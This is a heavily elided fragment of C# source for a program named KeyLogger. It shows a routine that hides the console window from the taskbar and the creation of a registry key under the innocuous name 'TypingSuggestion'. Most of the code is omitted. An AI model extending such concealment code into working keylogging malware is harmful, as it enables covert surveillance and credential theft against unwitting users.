...
namespace KeyLogger
{
    class Program
    {
        ...
        static void HideWindow()
        {
            ...
            int exStyle = GetWindowLong(console, GWL_EXSTYLE);
            SetWindowLong(console, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
        ...
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\TypingSuggestion");
